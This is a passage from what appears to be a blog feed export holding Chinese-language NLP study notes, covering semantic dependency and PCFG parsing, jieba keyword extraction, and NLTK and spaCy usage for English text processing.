Parsing,SDP，分析句子各个语言单位间的语义关联。</p><p>​使用语义依存刻画句子语义，好处在于不需要去抽象词汇本身，而是通过词汇所承受的语义框架来描述该词汇。</p><p>​语义依存分析目标是<strong>跨越句子表层句法结构的束缚</strong>，直接获取深层的语义信息。</p><p>​例如以下三个句子，用不同的表达方式表达了同一个语义信息，即张三实施了一个吃的动作，吃的动作是对苹果实施的。</p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/3-中文文本处理.assets/image-20200229201007335.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​语义依存分析<strong>不受句法结构的影响</strong>，将具有直接语义关联的语言单元直接连接依存弧并标记上相应的语义关系。</p><p>​ 语义依存关系分为三类，分别是</p><blockquote><ul><li>主要语义角色，每一种语义角色对应存在一个嵌套关系和反关系；</li><li>事件关系，描述两个事件间的关系；</li><li>语义依附标记，标记说话者语气等依附性信息。</li></ul></blockquote><p>​http://ltp.ai/demo.html，http://ltp.ai/docs/index.html：哈工大开源包网站</p><h2><span id="6语法解析">6.语法解析</span></h2><p>​句子可以用主语、谓语、宾语来表示。在自然语言的处理过程中，有许多应用场景都需要考虑句子的语法，因此研究语法解析变得非常重要。</p><p>​语法解析有两个主要的问题，其一是句子语法在计算机中的表达与存储方法，以及语料数据集；其二是语法解析的算法。</p><h4><span id="表达与存储">表达与存储</span></h4><p>​ 用树状结构图来表示</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/3-中文文本处理.assets/image-20200224180805695.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/3-中文文本处理.assets/image-20200229211941735.png" srcset="/img/loading.gif" lazyload alt="image"><figcaption aria-hidden="true">image</figcaption></figure><p>​NP、VP、PP是名词、动词、介词短语（短语级别）；N、V、P分别是名词、动词、介词。</p><h4><span id="语法解析的算法">语法解析的算法</span></h4><h5><span id="上下文无关语法context-freegrammer">上下文无关语法（Context-FreeGrammer）</span></h5><p>​ 为了生成句子的语法树，我们可以定义如下的一套上下文无关语法。</p><blockquote><p>•1）N表示一组非叶子节点的标注，例如{S、NP、VP、N...}</p><p>•2）Σ表示一组叶子结点的标注，例如{我们、尊敬...}</p><p>•3）R表示一组规则，每条规则可以表示为</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/3-中文文本处理.assets/image-20200229212501592.png" srcset="/img/loading.gif" lazyload alt="image" style="zoom:67%;"></p><p>•4）S表示语法树开始的标注</p></blockquote><p>​ 当给定一个句子时，我们便可以按照从左到右的顺序来解析语法。</p><p>​ 例如，句子the man sleeps就可以表示为(S (NP (DT the) (NN man)) (VPsleeps))。</p><p>​ 规则R示例如下：</p><blockquote><p>S -&gt; NP VP VP -&gt; V NP | V NP PP PP -&gt; P NP</p></blockquote><blockquote><p>V -&gt; "saw" | "ate" NP -&gt; "John" | "Mary" | "Bob" | Det N | DetN PP Det -&gt; "a" | "an" | "the" | "my" N -&gt; "dog" | "cat" |"cookie" | "park" P -&gt; "in" | "on" | "by" | "with"</p></blockquote><h5><span id="概率分布的上下文无关语法probabilisticcontext-free-grammar">概率分布的上下文无关语法（ProbabilisticContext-Free Grammar）</span></h5><p>​上下文无关的语法可以很容易的推导出一个句子的语法结构，但是缺点是推导出的结构可能存在<strong>二义性</strong>。</p><p>​由于语法的解析存在二义性，我们就需要找到一种方法从多种可能的语法树种找出最可能的一棵树。</p><p>​ 一种常见的方法既是PCFG （Probabilistic Context-FreeGrammar）。除了常规的语法规则以外，我们还对每<strong>一条规则赋予了一个概率</strong>。对于每一棵生成的语法树，我们将其中所有规则的<strong>概率的乘积作为语法树的出现概率</strong>。</p><p>​分别计算每颗语法树的概率p(t)，出现概率最大的那颗语法树就是我们希望得到的结果，即<strong>argmaxp(t)</strong>。</p><p>​ <strong>训练算法</strong>：</p><blockquote><p>算法依赖于CFG中对于N、Σ、R、S的定义以及PCFG中的p(x)。</p><blockquote><ul><li>统计出语料库中所有的N和Σ</li><li>利用语料库中的所有规则作为R</li><li>针对每个规则A -&gt; B，从语料库中估算p(x) = p(A -&gt; B) / p(A)</li></ul></blockquote><p>​在CFG的定义的基础上，重新定义一种叫Chomsky的语法格式。这种格式要求每条规则只能是X-&gt; Y1 Y2或者X -&gt;Y的格式。实际上Chomsky语法格式保证生产的语法树总是<strong>二叉树</strong>的格式，同时任意一棵语法树总是能够转化成Chomsky语法格式。</p></blockquote><p>​ <strong>语法树预测算法</strong>：</p><blockquote><p>输入一个句子x1, x2, ... , xn时，计算句子对应的语法树有两种方法：</p><ul><li>第一种方法是暴力遍历的方法，每个单词x可能有m =len(N)种取值，句子长度是n，每种情况至少存在n个规则，所以在时间复杂度<span class="math inline">\(O(mn^2)\)</span>的情况下，我们可以判断出所有可能的语法树并计算出最佳的那个。</li><li>第二种方法当然是动态规划，我们定义w[i, j,X]是第i个单词至第j个单词由标注X来表示的最大概率。w[i, j,PP]代表的是继续往上一层递归时，只选择当前概率最大的组合方式。</li></ul></blockquote><p>​ <strong>缺点</strong>：</p><p>​PCFG也有一些缺点，例如：1）缺乏词法信息；2）连续短语（如名词、介词）的处理等。但总体来讲它给语法解析提供了一种非常有效的实现方法。</p><h2><span id="7命名实体识别">7.命名实体识别</span></h2><p>​从一段非结构化文本中找出相关实体（triplet中的主词和宾词），并标注出其位置以及类型，它是NLP领域中一些复杂任务（如<strong>关系抽取</strong>、<strong>信息检索</strong>、<strong>知识问答</strong>、<strong>知识图谱</strong>等）的基础。</p><h1><span id="关键词抽取">关键词抽取</span></h1><p>​文本关键词抽取，是对文本信息进行高度凝练的一种有效手段，通过3-5个词语准确概括文本的主题，帮助读者快速理解文本信息。是文本检索、文本摘要等许多下游文本挖掘任务的基础性和必要性的工作。</p><h1><span id="常用包的使用"></span></h1><h1><span id="jieba">jieba</span></h1><h2><span id="基本分词函数与用法">基本分词函数与用法</span></h2><p>​ <strong>jieba.cut</strong> 以及<strong>jieba.cut_for_search</strong> 返回的结构都是一个可迭代的generator。</p><p>​<strong>jieba.lcut</strong>以及<strong>jieba.lcut_for_search</strong>直接返回list</p><h2><span id="添加用户自定义字典"><strong>添加用户自定义字典</strong></span></h2><ul><li><p>1.可以用jieba.load_userdict(file_name)加载用户字典</p></li><li><p>2.少量的词汇可以自己用下面方法手动添加：</p><ul><li>用 add_word(word, freq=None, tag=None) 和 del_word(word)在程序中动态修改词典用</li><li>suggest_freq(segment, tune=True)可调节单个词语的词频，使其能（或不能）被分出来。</li></ul></li></ul><h2><span id="词性标注">词性标注</span></h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba.posseg <span class="hljs-keyword">as</span> pseg    <span class="hljs-comment"># .posseg模块</span><br><br>words = pseg.cut()<br></code></pre></div></td></tr></table></figure><h2><span id="关键词抽取">关键词抽取</span></h2><h3><span id="基于-tf-idf算法的关键词抽取"><strong>基于 TF-IDF算法的关键词抽取</strong></span></h3><ul><li><p>import jieba.analyse</p></li><li><p>jieba.analyse.extract_tags(sentence, topK=20, withWeight=False,allowPOS=())</p><ul><li>sentence 为待提取的文本</li><li>topK 为返回几个 TF/IDF 权重最大的关键词，默认值为 20</li><li>withWeight 为是否一并返回关键词权重值，默认值为 False</li><li>allowPOS 仅包括指定词性的词，默认值为空，即不筛选</li></ul></li><li><p>自定义逆向文件频率（IDF）文本语料库</p><ul><li>用法： jieba.analyse.set_idf_path(file_name) #file_name为自定义语料库的路径<ul><li>自定义语料库示例见<a href="https://github.com/fxsjy/jieba/blob/master/extra_dict/idf.txt.big">这里</a></li><li>用法示例见<a href="https://github.com/fxsjy/jieba/blob/master/test/extract_tags_idfpath.py">这里</a></li></ul></li></ul></li><li><p>自定义停止词（Stop Words）文本语料库</p><ul><li>用法： jieba.analyse.set_stop_words(file_name) #file_name为自定义语料库的路径<ul><li>自定义语料库示例见<a href="https://github.com/fxsjy/jieba/blob/master/extra_dict/stop_words.txt">这里</a></li><li>用法示例见<a href="https://github.com/fxsjy/jieba/blob/master/test/extract_tags_stop_words.py">这里</a></li></ul></li></ul></li><li><p>关键词一并返回关键词权重值示例</p><ul><li>用法示例见<a href="https://github.com/fxsjy/jieba/blob/master/test/extract_tags_with_weight.py">这里</a></li></ul></li></ul><h3><span id="基于-textrank算法的关键词抽取"><strong>基于 TextRank算法的关键词抽取</strong></span></h3><ul><li><p>jieba.analyse.textrank(sentence, topK=20, withWeight=False,allowPOS=('ns', 'n', 'vn', 'v'))直接使用，接口相同，注意默认过滤词性。</p></li><li><p>jieba.analyse.TextRank() 新建自定义 TextRank 实例</p><p>算法论文： <a href="http://web.eecs.umich.edu/~mihalcea/papers/mihalcea.emnlp04.pdf">TextRank:Bringing Order into Texts</a></p></li></ul><p>基本思想:</p><ul><li>将待抽取关键词的文本进行分词</li><li>以固定窗口大小(默认为5，通过span属性调整)，词之间的共现关系，构建图</li><li>计算图中节点的PageRank，注意是无向带权图</li></ul><p>详解见<a href="https://github.com/RacleRay/NotesForBlogs/blob/master/basic/textrank.html">textrank</a></p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba.analyse <span class="hljs-keyword">as</span> analyse<br><br>analyse.textrank(lines, topK=<span class="hljs-number">20</span>, withWeight=<span class="hljs-literal">False</span>, allowPOS=(<span class="hljs-string">'ns'</span>, <span class="hljs-string">'n'</span>))<br></code></pre></div></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jieba.analyse <span class="hljs-keyword">as</span> analyse<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br>df = pd.read_csv(<span class="hljs-string">"./data/file.csv"</span>, encoding=<span class="hljs-string">'utf-8'</span>)<br>df = df.dropna()<br>lines=df.content.values.tolist()<br>content = <span class="hljs-string">""</span>.join(lines)  <span class="hljs-comment"># 一行输入</span><br><br>print(analyse.textrank(content, topK=<span class="hljs-number">20</span>, withWeight=<span class="hljs-literal">False</span>, allowPOS=(<span class="hljs-string">'ns'</span>, <span class="hljs-string">'n'</span>, <span class="hljs-string">'vn'</span>, <span class="hljs-string">'v'</span>)))<br>print(<span class="hljs-string">"-------------------------------------"</span>)<br>print(analyse.textrank(content, topK=<span class="hljs-number">20</span>, withWeight=<span class="hljs-literal">False</span>, allowPOS=(<span class="hljs-string">'ns'</span>, <span class="hljs-string">'n'</span>)))<br></code></pre></div></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> chinese process </tag>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>英文文本处理</title>
      <link href="/posts/80c1e4ba.html"/>
      <url>/posts/80c1e4ba.html</url>
      
        <content type="html"><![CDATA[<h1><span id="英文文本处理">英文文本处理</span></h1><p>​ 结合nltk包进行说明。</p><h2><span id="1-tokenization标记化分词">1 Tokenization(标记化/分词)</span></h2><p>​文本是不能成段送入模型中进行分析的，我们通常会<strong>把文本切成有独立含义的字、词或者短语</strong>，这个过程叫做tokenization，这通常是大家解决自然语言处理问题的第一步。</p><p>​ NLTK中提供了2种不同方式的tokenization： <strong>sentencetokenization</strong> 和 <strong>wordtokenization</strong>，前者把文本进行“断句”，后者对文本进行“分词”。</p><p>​ <strong>sentencetokenization</strong>相比于split的优势在于，是别不是句号的位置，如：Mr.H</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk <span class="hljs-keyword">import</span> word_tokenize, sent_tokenize<br></code></pre></div></td></tr></table></figure><h2><span id="2-去停用词">2 去停用词</span></h2><p>​在自然语言处理的<strong>一些任务</strong>中，我们处理的主体“文本”中有一些功能词经常出现，然而对于最后的任务目标并没有帮助，甚至会对结果产生干扰，我们把这类词叫做<strong>停用词</strong>。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">nltk.download(<span class="hljs-string">'stopwords'</span>)<br><br><span class="hljs-comment"># 导入内置停用词</span><br><span class="hljs-keyword">from</span> nltk.corpus <span class="hljs-keyword">import</span> stopwords<br><br>stop_words = stopwords.words(<span class="hljs-string">'english'</span>)<br></code></pre></div></td></tr></table></figure><h2><span id="3-词性标注part-of-speechtagging">3 词性标注（part-of-speechtagging）</span></h2><p>​ 词性（part-of-speech）是词汇基本的语法属性，通常也称为词性。</p><p>​词性标注是很多NLP任务的预处理步骤，如句法分析，经过词性标注后的文本会带来很大的便利性，但也不是不可或缺的步骤。</p><p>​ 主流的做法可以分为基于规则和基于统计的方法，包括：</p><blockquote><ul><li>基于最大熵的词性标注</li><li>基于统计最大概率输出词性</li><li>基于HMM的词性标注</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">nltk.download(<span class="hljs-string">'averaged_perceptron_tagger'</span>)<br><br><span class="hljs-comment"># 词性标注</span><br><span class="hljs-keyword">from</span> nltk <span class="hljs-keyword">import</span> pos_tag<br>tags = pos_tag(filtered_corpus)<br>tags[:<span class="hljs-number">20</span>]<br></code></pre></div></td></tr></table></figure><h2><span id="4-chunking组块分析">4 chunking/组块分析</span></h2><p>​chunking分块是命名实体识别的基础，词性给出来的句子成分的属性，但有时候，更多的信息(比如句子句法结构)可以帮助我们对句子中的模式挖掘更充分。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk.chunk <span class="hljs-keyword">import</span> RegexpParser  <span class="hljs-comment"># RegexpParser</span><br><span class="hljs-keyword">from</span> nltk <span class="hljs-keyword">import</span> sent_tokenize,word_tokenize<br><br><span class="hljs-comment"># 写一个匹配名词的模式</span><br><span class="hljs-comment"># JJadjective; NNnoun, singular or mass</span><br><span class="hljs-comment"># CCcoordinating conjunction</span><br>pattern = <span class="hljs-string">"""</span><br><span class="hljs-string">    NP: &#123;&lt;JJ&gt;*&lt;NN&gt;+&#125;</span><br><span class="hljs-string">    &#123;&lt;JJ&gt;*&lt;NN&gt;&lt;CC&gt;*&lt;NN&gt;+&#125;</span><br><span class="hljs-string">    """</span><br>    <br><span class="hljs-comment"># 定义组块分析器</span><br>chunker = RegexpParser(pattern)<br><br><span class="hljs-comment"># 分句</span><br>tokenized_sentence = nltk.sent_tokenize(text)<br><span class="hljs-comment"># 分词</span><br>tokenized_words = [nltk.word_tokenize(sentence) <span class="hljs-keyword">for</span> sentence <span class="hljs-keyword">in</span> tokenized_sentence]<br><span class="hljs-comment"># 词性标注</span><br>tagged_words = [nltk.pos_tag(word) <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tokenized_words]<br><span class="hljs-comment"># 识别组块</span><br>word_tree = [chunker.parse(word) <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> tagged_words]<br><br>word_tree[<span class="hljs-number">0</span>].draw()  <span class="hljs-comment"># 绘图</span><br></code></pre></div></td></tr></table></figure><h2><span id="5-命名实体识别namedentity-recognitionner">5 命名实体识别（NamedEntity Recognition，NER）</span></h2><p>​ 命名实体识别包括两部分：1) 实体边界识别；2)确定实体类别（人名、地名、机构名或其他）。</p><p>​ <a href="https://stanfordnlp.github.io/CoreNLP/" target="_blank" rel="noopener">stanford core nlpmodules</a> 速度更快，而且有更高的识别准确度。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk <span class="hljs-keyword">import</span> ne_chunk, pos_tag,  word_tokenize<br><br>sentence = <span class="hljs-string">"John studies at Stanford University."</span><br>print(ne_chunk(pos_tag(word_tokenize(sentence))))<br></code></pre></div></td></tr></table></figure><h2><span id="6stemming和lemmatizing-词干算法-和-词型还原">6Stemming和Lemmatizing 词干算法 和 词型还原</span></h2><p>​ 对英文当中的时态语态等做归一化。</p><p>​ Stemmer</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk.stem <span class="hljs-keyword">import</span> PorterStemmer<br><br>stemmer = PorterStemmer()<br>stemmer.stem(<span class="hljs-string">"running"</span>)<br><span class="hljs-comment"># Out: 'run'</span><br><br><br><span class="hljs-keyword">from</span> nltk.stem <span class="hljs-keyword">import</span> SnowballStemmer<br><br>stemmer2 = SnowballStemmer(<span class="hljs-string">"english"</span>)<br>stemmer2.stem(<span class="hljs-string">"growing"</span>)<br><span class="hljs-comment"># Out: 'grow'</span><br><br><span class="hljs-comment"># Create your own stemmer using Regular Expression</span><br><span class="hljs-keyword">from</span> nltk.stem <span class="hljs-keyword">import</span> RegexpStemmer<br><br>rst = RegexpStemmer(<span class="hljs-string">r'ing$|s$|e$|able$'</span>)<br>rst.stem(<span class="hljs-string">'controllable'</span>)<br><span class="hljs-comment"># Out: 'controll'</span><br></code></pre></div></td></tr></table></figure><p>​Lemmatization和Stemmer很类似，不同的地方在于Lemmatization会根据语言词根找到原型，而Stemmer只是根据规则截断结尾的-ing 等后缀。Stemmer的速度更快，但是它通常只是一系列的规则。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk.stem <span class="hljs-keyword">import</span> WordNetLemmatizer<br><br>lemmatizer = WordNetLemmatizer()<br>lemmatizer.lemmatize(<span class="hljs-string">"makes"</span>)<br><br><span class="hljs-comment"># If you do not provide POS tag of the word, </span><br><span class="hljs-comment"># lemmatizer will consider word as a noun and you may not get the result you expected </span><br>lemmatizer.lemmatize(<span class="hljs-string">'spoken'</span>)<br><span class="hljs-comment"># Out: 'spoken'</span><br><br><span class="hljs-comment"># 给出词性</span><br>lemmatizer.lemmatize(<span class="hljs-string">'spoken'</span>,<span class="hljs-string">'v'</span>)<br><span class="hljs-comment"># Out: 'speak'</span><br></code></pre></div></td></tr></table></figure><h2><span id="nltkwordnet">NLTK：WordNet</span></h2><blockquote><p>​ <a href="https://www.nltk.org/" target="_blank" rel="noopener">NLTK</a>，全称Natural LanguageToolkit，自然语言处理工具包，是NLP研究领域常用的一个Python库，由宾夕法尼亚大学的StevenBird和EdwardLoper在Python的基础上开发的一个模块，至今已有超过十万行的代码。这是一个开源项目，包含数据集、Python模块、教程等；NLTK是最常用的英文自然语言处理python基础库之一。</p></blockquote><h4><span id="corpus-module">Corpus Module</span></h4><figure><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/1/MethodsInCorpusModule.png" srcset="/img/loading.gif" lazyload alt="Corpus"><figcaption aria-hidden="true">Corpus</figcaption></figure><h4><span id="wordnet与词义解析">WordNet与词义解析</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk.corpus <span class="hljs-keyword">import</span> wordnet <span class="hljs-keyword">as</span> wn<br><br><span class="hljs-comment"># 同义</span><br>wn.synsets(<span class="hljs-string">'man'</span>)<br><br><span class="hljs-comment"># 第一种词义</span><br>wn.synsets(<span class="hljs-string">'man'</span>)[<span class="hljs-number">0</span>].definition()<br><span class="hljs-comment"># 第二种词义</span><br>wn.synsets(<span class="hljs-string">'man'</span>)[<span class="hljs-number">1</span>].definition()<br><br><span class="hljs-comment"># 造句：选择一种词义（dog.n.01）</span><br>dog = wn.synset(<span class="hljs-string">'dog.n.01'</span>)<br>dog.examples()[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># 上位词</span><br>dog.hypernyms()<br><br><span class="hljs-comment"># 查看不同词义下的Lemmatization解析</span><br><span class="hljs-keyword">for</span> syn <span class="hljs-keyword">in</span> wn.synsets(<span class="hljs-string">'spoken'</span>):<br>    print(syn,<span class="hljs-string">':'</span>, syn.lemma_names())<br></code></pre></div></td></tr></table></figure><h4><span id="frequency-distribution">Frequency Distribution</span></h4><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nltk <span class="hljs-keyword">import</span> ConditionalFreqDist, FreqDist<br><br>...<br>fd = FreqDist(l)<br>fd.most_common(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># Return a list of all samples that occur once</span><br>fd.hapaxes()<br><span class="hljs-comment"># Find the word occuring max number of times</span><br>fd_w_humor.max()<br><span class="hljs-comment"># Freq = Number of occurences / total number of words</span><br>fd_w_humor.freq(<span class="hljs-string">'the'</span>)<br><span class="hljs-comment"># check how many times word 'pen' appeared</span><br>fd_w_humor.get(<span class="hljs-string">'pen'</span>)<br>...<br><br><span class="hljs-comment"># Conditional Frequency Distribution</span><br><br><span class="hljs-comment"># Use tabulate mathod to check distribution of modal words in different genre </span><br>cfd = ConditionalFreqDist(<br>           (genre, word)<br>          <span class="hljs-keyword">for</span> genre <span class="hljs-keyword">in</span> brown.categories()<br>          <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> brown.words(categories=genre))<br><br>cfd.tabulate(conditions=genres, samples=modals)<br><br><span class="hljs-comment"># 绘制分布图</span><br>l_names = ([(<span class="hljs-string">'male'</span>,name[<span class="hljs-number">-1</span>]) <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names.words(<span class="hljs-string">'male.txt'</span>)] +<br>         [(<span class="hljs-string">'female'</span>,name[<span class="hljs-number">-1</span>]) <span class="hljs-keyword">for</span> name <span class="hljs-keyword">in</span> names.words(<span class="hljs-string">'female.txt'</span>)])<br>         <br>cfd_names = ConditionalFreqDist(l_names)<br>cfd_names.plot()<br></code></pre></div></td></tr></table></figure><h2><span id="spacy">SpaCy</span></h2><p>​ <a href="https://spacy.io/">spaCy</a>是Python和Cython中的高级自然语言处理库，它建立在最新的研究基础之上，从一开始就设计用于实际产品。spaCy带有预先训练的统计模型和单词向量，目前支持 20多种语言的标记。它具有快速的句法分析器，用于标签的卷积神经网络模型，解析和命名实体识别以及与深度学习整合。</p><blockquote><p>​ !pip install -i https://pypi.tuna.tsinghua.edu.cn/simple spaCy</p><p>​ !python -m spacy download en</p></blockquote><p>​ <a href="https://spacy.io/usage/models#languages" target="_blank" rel="noopener">支持的语言</a></p><p>​</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment"># Tokenization</span><br><span class="hljs-keyword">import</span> spacy<br><br>nlp = spacy.load(<span class="hljs-string">'en'</span>)<br>doc = nlp(<span class="hljs-string">'Hello World!'</span>)<br><br><span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc:<br>    print(<span class="hljs-string">'"'</span> + token.text + <span class="hljs-string">'"'</span>)<br>    <br><span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc:<br>    print(<span class="hljs-string">"&#123;0&#125;\t&#123;1&#125;\t&#123;2&#125;\t&#123;3&#125;\t&#123;4&#125;\t&#123;5&#125;\t&#123;6&#125;\t&#123;7&#125;"</span>.format(<br>        token.text,<br>        token.idx,     <span class="hljs-comment"># 开始index</span><br>        token.lemma_,  <span class="hljs-comment"># 原型</span><br>        token.is_punct,<span class="hljs-comment"># 判断标点</span><br>        token.is_space,<span class="hljs-comment"># 判断空格</span><br>        token.shape_,  <span class="hljs-comment"># 词格式</span><br>        token.pos_,    <span class="hljs-comment"># 词性</span><br>        token.tag_     <span class="hljs-comment"># 标注</span><br>    ))<br>    <br><span class="hljs-comment"># 断句</span><br><span class="hljs-keyword">for</span> sent <span class="hljs-keyword">in</span> doc.sents:<br>    print(sent)<br>    <br><br><span class="hljs-comment"># 词性标注</span><br>print([(token.text, token.tag_) <span class="hljs-keyword">for</span> token <span class="hljs-keyword">in</span> doc])<br><br><br><span class="hljs-comment"># NER</span><br><span class="hljs-keyword">for</span> ent <span class="hljs-keyword">in</span> doc.ents:<br>    print(ent.text, ent.label_)<br></code></pre></div></td></tr></table></figure><p>​ BIO/IOB tagging是一种对给定句子中的单元做序列标注的方式，用于从给定句子中抽取连续字/词块构成的有意义短语。</p><p>​每个词标注为B（Beginning，指示某短语起始）、I（Inside，指示短语内部）、O（Outside，指示不在短语中）中的一个。如：B-人名O B-机构名 I-机构名</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">iob_tagged = [<br>    (token.text, token.tag_, <span class="hljs-string">"&#123;0&#125;-&#123;1&#125;"</span>.format(token.ent_iob_, token.ent_type_)<br>    <span class="hljs-keyword">if</span> token.ent_iob_ != <span class="hljs-string">'O'</span> <span 